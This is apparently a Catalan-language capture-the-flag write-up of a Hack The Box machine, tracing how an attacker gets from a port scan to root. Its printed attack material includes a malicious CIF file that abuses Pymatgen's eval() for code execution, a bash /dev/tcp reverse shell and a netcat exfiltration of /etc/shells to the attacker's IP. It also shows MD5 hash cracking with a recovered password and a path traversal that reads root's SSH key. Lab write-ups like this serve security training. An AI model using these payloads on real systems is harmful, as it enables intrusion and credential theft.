<p align="center">
  <img src="https://github.com/user-attachments/assets/cb1f267f-5c70-40f3-a63c-9e13aeb6f527" alt="twomillion-htb-header" width="50%" height="50%">
</p>

---

## NMAP Scanning
Escaneig a través d'enviament de paquets TCP SYN a tots els ports del host per detectar quins estan oberts.
````bash
> nmap -p- --open -sS -v -n --min-rate=5000 -Pn -n 10.10.11.38

PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.40 seconds
           Raw packets sent: 65870 (2.898MB) | Rcvd: 65870 (2.635MB)
````

Amb els ports resultants de l'escaneig anterior, enumerar la versió i llençar els scripts per defecte de NMAP.

````bash
> nmap -sCV -p22,5000 -Pn 10.10.11.38

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  http    Werkzeug httpd 3.0.3 (Python 3.9.5)
|_http-server-header: Werkzeug/3.0.3 Python/3.9.5
|_http-title: Chemistry - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
````
Buscant la versió de SSH al launchpad d'Ubuntu ja es pot extreure que, segurament, el host té un Ubuntu Focal.

## Web enumeration
Al port 5000 hi ha un servei web que es titula "Chemistry CIF Analyzer", i es descriu com "una eina per pujar un arxiu CIF i analitzar les dades estructurals que conté". Aquest tipus d'arxius són un estàndard emprat en l'àmbit de la cristal·lografia per representar la informació estructural d'un cristall. Per utilitzar aquesta eina, però, cal tenir una sessió vàlida, que podem obtenir registrant-nos.

![image](https://github.com/user-attachments/assets/a6df5103-bbf3-4cbd-9f38-a84e68b351c0)

Un cop creada la sessió, la pròpia pàgina ens proporciona un arxiu .cif d'exemple, que podem utilitzar per provar la seva funcionalitat. 
````bash
# example.cif
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
````
Si pugem aquest arxiu i hi accedim, podem veure que la informació del fitxer se'ns representa en forma de taula, separant per categories que hi ha definides dins d'aquest. 

![image](https://github.com/user-attachments/assets/fdaab062-b066-4377-91d7-8a0d6de0e466)

Si tirem de WhatWeb, a més, sabem que aquesta funcionalitat s'està duent a terme a nivell de backend a través d'alguna mena de script de Python, ja que la web està construïda amb Werkzeug 3.0.3.

![image](https://github.com/user-attachments/assets/a678a9c7-e062-4123-84e2-0f9b3a6bf36e)

## Initial foothold
El primer que ve al cap, doncs, és si podem manipular un arxiu .cif per introduir-hi codi maliciós amb Python. D'aquesta manera, tenim una via potencial per executar comandes a nivell de sistema. Buscant per Internet, trobem que la llibreria de Python que gestiona els arxius CIF, Pymatgen, té associada una vulnerabilitat que permet justament això, degut a que crida a la funció _eval()_ quan s'analitza la informació que li podem donar nosaltres de manera arbitrària.
La descripció oficial de la vulnerabilitat conté un PoC que permet explotar aquesta vulnerabilitat.
````bash
# Fitxer CIF maliciós
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("touch pwned");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
````

Substituïm la comanda de l'exemple per la que vulguem, en aquest cas provem de fer un ping a la nostra IP per comprovar si tenim execució remota de comandes i si tenim connexió cap a la nostra màquina atacant, tot en una sola vegada. Per tant, ens fiquem en escolta per la interfície _tun0_ amb TCPDump per capturar totes les traces ICMP que rebem.

![image](https://github.com/user-attachments/assets/22bd6ac3-3049-4458-a94c-9b74512d02d3)

I fem el mateix procediment que hem fet al principi per provar la funcionalitat de la pàgina, només que aquesta vegada ens retorna un codi 500 per error del servidor.

![image](https://github.com/user-attachments/assets/5dde3611-f34e-4163-9bcf-e4a114b0129f)

No obstant, hem rebut la traça IP que hem enviat des del servidor que corre el servei web.

![image](https://github.com/user-attachments/assets/e993929c-1eb5-4aed-b888-c6ae1d3e68a6)

Per tant, podem fer el mateix procediment però per establir-nos una reverse shell. Modifiquem el codi de l'arxiu CIF, ens fiquem en escolta pel port 4321 amb NetCat i tornem a pujar l'arxiu. 

Ho fem a través d'una consola _bash_ i no obtenim cap resultat. Per tant, pot ser que hi hagi algun tipus de firewall impedint que ens establim una reverse shell. Per comprovar quines altres consoles hi ha disponibles al host, ens podem portar l'arxiu _/etc/shells_ de la màquina objectiu a la nostra màquina a través de Netcat.
````bash
# Atacant
nc -lvnp 4321 > shells.txt

# Víctima
nc 10.10.16.30 4321 < /etc/shells
````

I es crea un arxiu _shells.txt_ amb el contingut que ens hem enviat des de la màquina objectiu.

````
> cat shells.txt

# /etc/shells: valid login shells
/bin/sh
/bin/bash
/usr/bin/bash
/bin/rbash
/usr/bin/rbash
/bin/dash
/usr/bin/dash
/usr/bin/tmux
/usr/bin/screen
````
Podem provar el mateix payload amb les diferents consoles per comprovar si ens permeten establir-nos la reverse shell o si també estan protegides per aquest firewall. 

Quan ho fem amb la shell _/usr/bin/bash_, tenim una connexió establerta però podem observar que, si que escrivim "bash" als arguments, se'ns afegeix un caracter que impedeix que poguem tenir aquesta consola interactiva al host. Tot i això, podem seguir el mateix procediment que hem fet fins ara i provar altres tipus de consoles.  

![image](https://github.com/user-attachments/assets/bdfb3c88-39a4-4531-870d-f91c6f0d9a62)

I utilitzant una _sh_ aconseguim tenir una pseudoconsola al host.
````bash
# Payload
 /usr/bin/bash -c '/bin/sh -i >& /dev/tcp/10.10.16.30/4321 0>&1'
````

![image](https://github.com/user-attachments/assets/acd52ae2-0914-4171-b80d-646b5c2e6bd9)

Per comoditat, podem fer-li el tractament estàndard per a transformar-la en una consola _bash_ totalment interactiva, amb els següents passos:
````
1. script /dev/null -c bash
2. [_Ctrl+Z_] stty raw -echo; fg
3. reset xterm
4. export TERM=xterm
5. export SHELL=bash
````
I ja podem operar com l'usuari _app_ de forma funcional.

![image](https://github.com/user-attachments/assets/a8128591-e49d-44f2-9065-2e87f690feee)

## User
Al fitxer _/etc/passwd_ trobem que hi ha 3 usuaris als quals podem accedir: _app_ (que ho som actualment), _rosa_ i _root_.
````bash
> cat /etc/passwd | grep 'sh$'

root:x:0:0:root:/root:/bin/bash
rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
app:x:1001:1001:,,,:/home/app:/bin/bash
````
D'altra banda, si llistem el contingut de tots els directoris de la web, podem veure un arxiu .db, que correspon a la base de dades de la pàgina. Això inclou, doncs, tots els usuaris creats, amb les seves corresponents contrasenyes.
````bash
> ls -la *

-rw------- 1 app app 5852 Oct  9 20:08 app.py

instance:
total 28
drwx------ 2 app app  4096 Mar 15 12:30 .
drwxr-xr-x 8 app app  4096 Mar 15 12:39 ..
-rwx------ 1 app app 20480 Mar 15 12:30 database.db

static:
total 16
drwx------ 2 app  app  4096 Oct  9 20:13 .
drwxr-xr-x 8 app  app  4096 Mar 15 12:39 ..
-rw-r--r-- 1 root root  376 Oct  9 20:13 example.cif
-rwx------ 1 app  app  2312 Oct  9 20:10 styles.css

templates:
total 28
drwx------ 2 app app 4096 Oct  9 20:18 .
drwxr-xr-x 8 app app 4096 Mar 15 12:39 ..
-rwx------ 1 app app 1985 Oct  9 20:18 dashboard.html
-rwx------ 1 app app 1005 Oct  9 20:08 index.html
-rwx------ 1 app app 1196 Oct  9 20:08 login.html
-rwx------ 1 app app 1201 Oct  9 20:09 register.html
-rwx------ 1 app app 2176 Oct  9 20:09 structure.html

uploads:
total 12
drwx------ 2 app app 4096 Mar 15 12:26 .
drwxr-xr-x 8 app app 4096 Mar 15 12:39 ..
-rw-r--r-- 1 app app  756 Mar 15 12:26 526342dc-6e7d-481d-aca8-66f3a95b3e8d_example.cif
````
El copiem a la nostra màquina com hem fet abans amb l'arxiu _/etc/shells_ i aplicant-li la comanda _file_ veiem que es un arxiu de SQLite3.
````bash
> file database.db
database.db: SQLite 3.x database, last written using SQLite version 3031001, file counter 273, database pages 5, cookie 0x2, schema 4, UTF-8, version-valid-for 273
````
L'obrim, doncs, amb aquesta eina i llistem el contingut de la taula d'usuaris per obtenir els hashes md5 que ens interessen. En aquest cas, el dels usuaris _rosa_, perquè hem vist que és un usuari del sistema, i el de _admin_, simplement perquè és l'administrador.

![image](https://github.com/user-attachments/assets/ca45ce3b-ed2b-4e05-81d9-75b33e734478)

Els passem a un arxiu independent anomenat _hashes.txt_ i els intentem crackejar amb Hashcat.
````bash
> hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
````
I aconseguim la contrasenya de l'usuari _rosa_: _unicorniosorsados_, que ens permet loguejar-nos al sistema com aquest usuari.

![image](https://github.com/user-attachments/assets/7d9605ed-f143-4851-83ed-25dab7266f9e)

## Privilege escalation
Llistant els ports que la màquina té oberts de forma interna, en trobem un que no es veia des de fora: 8080. 
````bash
> netstat -tunlp

Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      2566/bash           
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -     
````
Podem aplicar _Port Forwarding_ per a poder analitzar-lo des de la nostra màquina. Com hi ha _ssh_ activat i tenim la contrasenya de l'usuari _rosa_, la manera més fàcil és iniciar sessió a través d'aquest protocol, aplicant SSH Tunneling per a que el port 80 de la nostra màquina sigui el port 8080 de la màquina víctima. 
````bash
> ssh -L 80:localhost:8080 rosa@10.10.11.38
````
Hi trobem una pàgina amb un servei de monitoratge de webs. De primeres, no hi trobem cap via potencial d'explotació ni cap directori que ens proporcioni cap tipus d'informació.

![image](https://github.com/user-attachments/assets/bfef4015-6a6c-4408-823f-03bef8c40f41)

Si enumerem les tecnologies emprades amb WhatWeb, s'observa que s'està utilitzant _AioHTTP 3.9_, una llibreria de Python que, en aquesta versió, té associada una vulnerabilitat de Path Traversal.

![image](https://github.com/user-attachments/assets/7246dbce-81ae-43ad-8254-1690a3478235)

A més, llistant els processos que estan corrent al sistema, trobem la ruta on està allotjada aquesta web i podem veure que s'està executant com l'usuari _root_ i, per tant, amb privilegis.
````bash
> ps aux | grep root

[...]
root        1081  0.0  1.4 257776 28836 ?        Ssl  Mar14   0:00 /usr/bin/python3.9 /opt/monitoring_site/app.py
[...]
````
Així doncs, tenim accés a tots els fitxers del sistema, inclús a la clau privada de SSH de l'usuari _root_, si és que la té. Explotem la vulnerabilitat a través de l'únic directori que existeix, _/assets_, per intentar obtenir-la.

![image](https://github.com/user-attachments/assets/08031f43-20e3-4033-a8aa-a22508abe393)

I, com existeix, podem utilitzar-la per iniciar sessió amb privilegis de root al host.

![image](https://github.com/user-attachments/assets/ca302b49-acc0-4074-9beb-d5c3bd2d56eb)
